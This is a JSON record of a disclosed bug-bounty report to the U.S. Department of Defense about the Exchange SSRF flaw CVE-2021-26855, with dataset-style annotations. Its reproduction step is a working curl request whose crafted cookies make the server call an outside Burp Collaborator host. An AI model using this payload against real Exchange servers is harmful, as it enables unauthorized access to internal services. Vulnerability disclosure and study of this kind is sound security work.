@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "spongebhav ",
+  "title": "CVE-2021-26855 on \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 resulting in SSRF",
+  "content": "\nDescription:\nCVE-2021-26855 exists on \u2588\u2588\u2588\u2588\u2588\u2588\u2588 resulting in SSRF\nReferences\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26855\nhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26855\nImpact\nServer Side Request Frogery\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-26855\nSteps to Reproduce\nCode 553 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: \u2588\u2588\u2588\u2588\u2588' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11.1; rv:86.0) Gecko/20100101 Firefox/86.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'X-AnonResource=true; X-AnonResource-Backend=burpcollaborator.net/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3' \\\n4    $'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/owa/auth/x.js'\nOUTPUT:\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Server-Side Request Forgery (SSRF)"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1616633640,
+  "report_url": "https://hackerone.com/reports/1119228",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a crafted HTTP GET request to the target server with specific headers and cookies designed to trigger the SSRF vulnerability."
+    ],
+    [
+      2,
+      "Observe the response from the server to confirm the SSRF vulnerability, which may include requests to internal resources or external domains specified in the attack."
+    ]
+  ],
+  "vuln_description": "CVE-2021-26855 is a Server-Side Request Forgery (SSRF) vulnerability in Microsoft Exchange Server. It allows an attacker to send arbitrary HTTP requests from the Exchange server, potentially leading to unauthorized access to internal services or information disclosure.",
+  "reason": "The vulnerability involves crafting specific HTTP headers and cookies to exploit the SSRF flaw. While the attack requires precise header manipulation, the steps are straightforward once the exploit details are known. The complexity is mitigated by the availability of public exploit details and the lack of need for complex application state manipulation or novel logic.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
